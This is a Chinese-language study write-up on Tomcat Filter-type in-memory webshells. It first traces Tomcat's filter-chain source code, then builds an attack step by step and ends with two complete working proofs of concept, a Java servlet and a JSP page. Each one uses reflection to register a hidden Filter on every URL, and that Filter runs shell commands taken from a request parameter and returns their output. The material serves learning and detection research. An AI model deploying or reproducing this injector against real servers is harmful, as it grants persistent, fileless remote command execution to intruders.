之前我们讲，我们的请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行，当我们在 filter 中添加恶意代码，就会进行命令执行，这样也就成为了一个内存 Webshell

所以我们后文的目标：**动态注册恶意 Filter，并且将其放到 最前面**

# Tomcat Filter流程分析

## 项目搭建
Tomcat 8.5.81

自定义Filter
```java
import javax.servlet.*;  
import java.io.IOException;  
  
public class filter implements Filter{  
    @Override  
 public void init(FilterConfig filterConfig) throws ServletException {  
        System.out.println("Filter 初始构造完成");  
 }  
    @Override  
 public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {  
        System.out.println("执行了过滤操作");  
 filterChain.doFilter(servletRequest,servletResponse);  
 }  
    @Override  
 public void destroy() {  
    }  
}
```
然后修改web.xml注册、激活路由
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"  
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"  
         version="4.0">  
         
    <filter>        
	    <filter-name>filter</filter-name>起名字叫filter 
        <filter-class>filter</filter-class>实现过滤功能的类  
    </filter>
    
    <filter-mapping>
        <filter-name>filter</filter-name>  使用的过滤器，对应刚刚起的名字
        <url-pattern>/filter</url-pattern> 拦截规则是访问/filter才会拦截 
    </filter-mapping>
    
</web-app>
```
启动之后可以看到，我们当前首次访问的时候初始化了Filter 每次访问都会执行过滤操作
![](picture/Pasted%20image%2020260105170610.png)

# 访问 /filter时的源码分析
根据我们前面知道，进入Filter中的时候，会调用 `Filter.doFilter()`内部的 `filterChain.doFilter()`来执行过滤操作，那我们就打断点进去看看
ok，我们首次访问之后初始化，初始化完毕之后进入 `filterChain.doFilter()`
![](picture/Pasted%20image%2020260105172128.png)
这里会进到 `ApplicationFilterChain` 类的 doFilter() 方法，它主要是进行了 `Globals.IS_SECURITY_ENABLED`，也就是全局安全服务是否开启的判断。
![](picture/Pasted%20image%2020260105172327.png)
步过这个`if`
到达了 `internalDoFilter()`
![](picture/Pasted%20image%2020260105172556.png)
通过观察我们也可以发现，其实整个过滤的过程都是在传递request和response对象，让他们走一遍过滤器链。
![](picture/Pasted%20image%2020260105172817.png)
ok我们回到正题，接着进入 `internalDoFilter()`
我们可以发现，源代码也写着 `// Call the next filter if there is one`
这里就是我们之前说到的FilterChain的地方，通过循环，把每一个Filter都过一遍
![](picture/Pasted%20image%2020260105173543.png)
可以看到 `ApplicationFilterConfig filterConfig = filters[pos++];`这行有一个filters数组，
这里数组中有两个对象，\[0\]是我们自己写的名字叫filter 走的逻辑是filter类，
还有一个\[1\]是Tomcat的过滤器，名字叫Tomcat WebSocket Filter ，走的是 `org.apache.tomcat.websocket.server.WsFilter`类的逻辑
![](picture/Pasted%20image%2020260105173703.png)

可以看到，最终执行了 `filter.doFilter()`执行了我们过滤器的主逻辑
![](picture/Pasted%20image%2020260105174954.png)
![](picture/Pasted%20image%2020260105175048.png)
然后再次循环，可以看到pos变为1了

![](picture/Pasted%20image%2020260105175124.png)
循环完毕，可以看到一些释放的操作
![](picture/Pasted%20image%2020260105180108.png)
最终去调用servlet.service()把request 和response传递下去

这里就呼应了我们之前讲Tomcat的时候说的，由最开始的`Filter.doFilter()`调用 `filterChain.doFilter()`然后由最后的 `filterChain`去调用 `Servlet。service()`

# 访问 /filter之前的源码分析

回到主线，我们的思路是要在filter的最前面加上我们的东西，让他执行恶意命令对吧。
那我们就要找找filter是怎么生成的，然后让他能调用到我们的东西就完美了。

这里看到Drun1baby师傅是通过idea的堆栈图来逆向分析的，给我了一些启发。
在这个堆栈图
![](picture/Pasted%20image%2020260105184508.png)
我们之前学习的时候知道，jvm运行当中内存会被划分为堆和栈，堆中存放对象，栈里存放执行中的方法，也就是这里的这个图，这里存放了所有过程中执行过的方法。

看我们这里是从分配线程开始的，通过粗略观察，我们可以发猜测出发生的一些动作。

![](picture/Pasted%20image%2020260105185221.png)
配合我们之前这个图就更加清晰了。
```
Server (整个 Tomcat 服务器)
└── Service (服务：将 Connector 和 Engine 组合在一起)
    ├── Connector (连接器：监听端口，负责 HTTP 协议解析，外交官)
    └── Engine (引擎：管理虚拟主机，Servlet 引擎核心)
        └── Host (虚拟主机：例如 localhost，对应域名)
            └── Context (Web 应用：对应你的项目)
	           ├── Listeners (监听器列表：最先触发) ⭐
	           ├── Filters (过滤器链：请求必经之路) ⭐
	           └── Wrappers (包装器：里面住着具体的 Servlet)⭐
```
![](picture/Pasted%20image%2020260105191649.png)
所以，我们简单看一遍就会发现我们想找的地方
从这里最后一个invoke 开始，就开始进行doFilter的过程了
![](picture/Pasted%20image%2020260105185911.png)

ok开始分析
在这个invoke方法里，我们看到了 `// Create the filter chain for this request`
![](picture/Pasted%20image%2020260105190927.png)
并且在下面调用了 `filterChain.doFilter()`走到了我们上一个标题分析过的 `doFilter`

那我们就看看 `ApplicationFilterChain filterChain =  ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);`
到底是怎么创建 `FilterChain`的

配合着注释，我们可以大概了解过程，做了一系列安全判断，最终new了一个 `ApplicationFilterChain()`然后从上下文中拿到 `filterMaps[]`
这个 `filterMaps`就装着对路由的映射，告诉Tomcat 访问什么路由的时候，会执行什么Filter
![](picture/Pasted%20image%2020260105192250.png)
遍历`StandardContext.filterMaps`得到filter与URL的映射关系并通过`matchDispatcher()`、`matchFilterURL()`方法进行匹配，匹配成功后，还需判断`StandardContext.filterConfigs`中，是否存在对应filter的实例，当实例不为空时通过`addFilter`方法，将管理filter实例的`filterConfig`添加入`filterChain`对象中。
![](picture/Pasted%20image%2020260105192710.png)
最后 return回去，走到刚刚看的doFilter，真正的执行Filter。



# Filter内存马攻击思路
内存马的思路就是
如果我也写一段代码，调用 Context 里的某个 `put` 方法（虽然它是私有的，但我们可以用反射），把我的马塞进 `filterConfigs` 这个 Map。那么，Tomcat 在下次执行 `findFilterConfig` 时，就会“无意识”地把我的马取出来执行。
本质也就是如何修改我的 `filterMaps`，也就是如何修改 web.xml 中的 filter-mapping 标签。
只要让`filterMaps`映射到我的恶意 `Filter`就能执行恶意代码了。

filterMaps 可以通过如下两个方法添加数据，对应的类是 `StandardContext` 这个类
```java
@Override
public void addFilterMap(FilterMap filterMap) {
    validateFilterMap(filterMap);
    // Add this filter mapping to our registered set
    filterMaps.add(filterMap);
    fireContainerEvent("addFilterMap", filterMap);
}

@Override
public void addFilterMapBefore(FilterMap filterMap) {
    validateFilterMap(filterMap);
    // Add this filter mapping to our registered set
    filterMaps.addBefore(filterMap);
    fireContainerEvent("addFilterMap", filterMap);
}
```

`StandardContext` 这个类是一个容器类，它负责存储整个 Web 应用程序的数据和对象，并加载了 web.xml 中配置的多个 Servlet、Filter 对象以及它们的映射关系。

里面有三个和Filter有关的成员变量：
```java
filterMaps变量：包含所有过滤器的URL映射关系 

filterDefs变量：包含所有过滤器包括实例内部等变量 

filterConfigs变量：包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理
```
filterConfigs 成员变量是一个HashMap对象，里面存储了filter名称与对应的`ApplicationFilterConfig`对象的键值对，在`ApplicationFilterConfig`对象中则存储了Filter实例以及该实例在web.xml中的注册信息。

filterDefs 成员变量成员变量是一个HashMap对象，存储了filter名称与相应`FilterDef`的对象的键值对，而`FilterDef`对象则存储了Filter包括名称、描述、类名、Filter实例在内等与filter自身相关的数据

filterMaps 中的`FilterMap`则记录了不同filter与`UrlPattern`**的映射关系**
代码理解
```java
private HashMap<String, ApplicationFilterConfig> filterConfigs = new HashMap(); 

private HashMap<String, FilterDef> filterDefs = new HashMap(); 

private final StandardContext.ContextFilterMaps filterMaps = new StandardContext.ContextFilterMaps();
```



讲完了一些基础的概念，我们来看一看 ApplicationFilterConfig 里面存了什么东西
它有三个重要的东西：  
一个是Context，一个是filter，一个是filterDef
![](picture/Pasted%20image%2020260105194557.png)
![](picture/Pasted%20image%2020260105194708.png)
现在我们好奇的就是，他是怎么把我们的映射关系存进他的上下文，然后放进 `FilterMap`的

那好，我们现在去 `org.apache.catalina.core.StandardContext`标准上下文这个类中看看我们的映射关系是怎么放进上下文的？
在这个类中，可以看到两个有趣的方法
一个是 `filterStart()`这里的 `filterConfigs.put(name, filterConfig);`把配置放进hashmap了
![](picture/Pasted%20image%2020260105195252.png)

还有就是他有这个方法，可以把映射关系添加到 `filterMap`中
![](picture/Pasted%20image%2020260105195422.png)

总结下来：
动态添加一个`Filter`过程大致如下:
 - 获取`standardContext`.
 - 创建`Filter`.
 - 利用`filterDef`封装`Filter`对象, 并将`filterDef`添加到`filterDefs`里面.
 - 创建`filterMap`, 将`url`和`filter`进行绑定并添加到`filterMaps`里面.
 - 利用`ApplicationFilterConfig`封装`filterDef`对象并添加到`filterConfigs`里面.


## 构造
所以我们的构造思路如下：
1. 获取当前的标准上下文对象
2. 通过标准上下文对象获取 `filterConfigs`
3. 接着put进去我们自己的 `filter`对象
4. 然后为我们自己的 `filter`创建一个 `FilterDef`
5. 最后把ServletContext对象、filter对象、FilterDef全部都设置到filterConfigs即可完成内存马的实现


#  Filter 型内存马的实现

标准思路是这样的
![](picture/Pasted%20image%2020260105212912.png)

## 反射获取到 standContext

`standardContext`主要负责管理`session`，`Cookie`，`Servlet`的加载和卸载, 因此在`Tomcat`中的很多地方都有保存。如果我们能够直接获取`request`的时候，可以使用以下方法直接获取`context`。`Tomcat`在启动时会为每个`Context`都创建一个`ServletContext`对象，表示一个`Context`, 从而可以将`ServletContext`转化为`StandardContext`。
```java
ServletContext servletContext = request.getSession().getServletContext();//先通过session拿到ServletContext ，本质是ApplicationContextFacade的马甲类 
  
  //通过反射访问私有属性context，拿到了ApplicationContext
 Field appctx = servletContext.getClass().getDeclaredField("context"); 
 appctx.setAccessible(true);  
 ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
  
  //再次反射拿StandardContext
 Field stdctx = applicationContext.getClass().getDeclaredField("context");  
 stdctx.setAccessible(true);  
 StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
  
  
  //拿到filterConfigs这个Map
 String FilterName = "cmd_Filter";  
 Configs = standardContext.getClass().getDeclaredField("filterConfigs");  
 Configs.setAccessible(true);  
 filterConfigs = (Map) Configs.get(standardContext); 
 
 //后面把恶意的Filter put到map中
```

## 创建Filter
直接在代码中实现`Filter`实例，需要重写三个重要方法: `init`、`doFilter`、`destory`。

```java
Filter filter = new Filter() {

    @Override
    public void init(FilterConfig filterConfig) {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {

        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
        if (httpServletRequest.getParameter("cmd") != null) {
            InputStream inputStream = Runtime.getRuntime().exec(httpServletRequest.getParameter("cmd")).getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
            String output = scanner.hasNext() ? scanner.next() : "";
            servletResponse.getWriter().write(output);
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
};
```
## 创建filterDef封装Filter对象
如下代码将内存马融合进了反序列化的`payload`中，因此这里利用了反射来获取`FilterDef`对象。如果使用的是`jsp`或者是非反序列化的利用，则可以直接使用`new`来创建对象。

```java
//反射获取 FilterDef，设置 filter 名等参数后，调用 addFilterDef 将 FilterDef 添加
Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
Constructor filterDefDeclaredConstructor = FilterDef.getDeclaredConstructor();
FilterDef filterDef = (FilterDef) filterDefDeclaredConstructor.newInstance();
filterDef.setFilter(filter);
filterDef.setFilterName(FilterName);
filterDef.setFilterClass(filter.getClass().getName());
standardContext.addFilterDef(filterDef);
```



## 创建filterMap绑定URL
通过反射创建`FilterMap`实例，该部分代码主要是注册`filter`的生效路由，并将`FilterMap`对象添加在`standardContext`中`FilterMaps`变量的第一个。

```java
//反射获取 FilterMap 并且设置拦截路径，并调用 addFilterMapBefore 将 FilterMap 添加进去
Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
Constructor filterMapDeclaredConstructor = FilterMap.getDeclaredConstructor();
FilterMap filterMap = (FilterMap) filterMapDeclaredConstructor.newInstance();
filterMap.addURLPattern("/*");
filterMap.setFilterName(FilterName);
filterMap.setDispatcher(DispatcherType.REQUEST.name());
standardContext.addFilterMapBefore(filterMap);
```

## 获取`filterConfigs`变量并添加`filterConfig`对象
先获取在`standardContext`中存储的`filterConfigs`变量, 之后通过反射生成`ApplicationFilterConfig`对象，并将其放入`filterConfigs hashMap`中。

```java
Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
Constructor<?> applicationFilterConfigDeclaredConstructor = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);
applicationFilterConfigDeclaredConstructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) applicationFilterConfigDeclaredConstructor.newInstance(standardContext, filterDef);
filterConfigs.put(FilterName, filterConfig);
```

## POC
### Java版本

```java
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.apache.catalina.core.ApplicationFilterConfig;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;
import java.util.Scanner;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/8/15 9:55 下午
 */

@WebServlet("/exploitServlet")
public class exploitServlet extends HttpServlet {

    protected void doGet(HttpServletRequest request, HttpServletResponse response) {

        this.doPost(request, response);
    }

    protected void doPost(HttpServletRequest request, HttpServletResponse response) {

        Field Configs = null;
        Map filterConfigs;
        try {
            ServletContext servletContext = request.getSession().getServletContext();
            Field appContext = servletContext.getClass().getDeclaredField("context");
            appContext.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);

            Field stdContext = applicationContext.getClass().getDeclaredField("context");
            stdContext.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);

            String FilterName = "H3rmesk1t_Filter";
            Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            filterConfigs = (Map) Configs.get(standardContext);

            if (filterConfigs.get(FilterName) == null) {
                Filter filter = new Filter() {

                    @Override
                    public void init(FilterConfig filterConfig) {

                    }

                    @Override
                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {

                        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
                        if (httpServletRequest.getParameter("cmd") != null) {
                            InputStream inputStream = Runtime.getRuntime().exec(httpServletRequest.getParameter("cmd")).getInputStream();
                            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
                            String output = scanner.hasNext() ? scanner.next() : "";
                            servletResponse.getWriter().write(output);
                            return;
                        }
                        filterChain.doFilter(servletRequest, servletResponse);
                    }

                    @Override
                    public void destroy() {

                    }
                };

                Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                Constructor filterDefDeclaredConstructor = FilterDef.getDeclaredConstructor();
                FilterDef filterDef = (FilterDef) filterDefDeclaredConstructor.newInstance();
                filterDef.setFilter(filter);
                filterDef.setFilterName(FilterName);
                filterDef.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(filterDef);

                Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                Constructor filterMapDeclaredConstructor = FilterMap.getDeclaredConstructor();
                FilterMap filterMap = (FilterMap) filterMapDeclaredConstructor.newInstance();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName(FilterName);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(filterMap);

                Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                Constructor<?> applicationFilterConfigDeclaredConstructor = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);
                applicationFilterConfigDeclaredConstructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) applicationFilterConfigDeclaredConstructor.newInstance(standardContext, filterDef);
                filterConfigs.put(FilterName, filterConfig);

                response.getWriter().write("Inject Successfully!");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### JSP版本

```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.PushbackInputStream" %><%--
  Created by IntelliJ IDEA.
  User: h3rmesk1t
  Date: 2022/8/15
  Time: 1:32 下午
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
  <head>
    <title>Filter</title>
  </head>
  <body>
    <%
      Field requestFiled = request.getClass().getDeclaredField("request");
      requestFiled.setAccessible(true);
      Request req = (Request) requestFiled.get(request);
      StandardContext standardContext = (StandardContext) req.getContext();

      Field configs = standardContext.getClass().getDeclaredField("filterConfigs");
      configs.setAccessible(true);
      Map filterConfigs = (Map) configs.get(standardContext);

      String FilterName = "H3rmesk1t_Filter";
      if (filterConfigs.get(FilterName) == null) {
        Filter filter = new Filter() {
          @Override
          public void init(FilterConfig filterConfig) {

          }

          @Override
          public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
            if (httpServletRequest.getParameter("jsp") != null) {
              boolean isLinux = true;
              String osType = System.getProperty("os.name");
              if (osType != null && osType.toLowerCase().contains("win")) {
                isLinux = false;
              }

              String[] cmds = isLinux ? new String[] {
                      "sh",
                      "-c",
                      httpServletRequest.getParameter("jsp")
              } : new String[] {
                      "cmd.exe",
                      "/c",
                      httpServletRequest.getParameter("jsp")
              };

              InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
              Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
              String output = scanner.hasNext() ? scanner.next() : "";
              servletResponse.getWriter().write(output);
              servletResponse.getWriter().flush();
              return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
          }

          @Override
          public void destroy() {

          }
        };

        Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
        Constructor filterDefDeclaredConstructor = FilterDef.getDeclaredConstructor();
        FilterDef filterDef = (FilterDef) filterDefDeclaredConstructor.newInstance();
        filterDef.setFilter(filter);
        filterDef.setFilterName(FilterName);
        filterDef.setFilterClass(filter.getClass().getName());
        standardContext.addFilterDef(filterDef);

        Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
        Constructor filterMapDeclaredConstructor = FilterMap.getDeclaredConstructor();
        FilterMap filterMap = (FilterMap) filterMapDeclaredConstructor.newInstance();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(FilterName);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        standardContext.addFilterMapBefore(filterMap);

        Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
        Constructor<?> applicationFilterConfigDeclaredConstructor = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);
        applicationFilterConfigDeclaredConstructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) applicationFilterConfigDeclaredConstructor.newInstance(standardContext, filterDef);
        filterConfigs.put(FilterName, filterConfig);

        System.out.print("Inject Successfully!");
      }
    %>
  </body>
</html>
```

















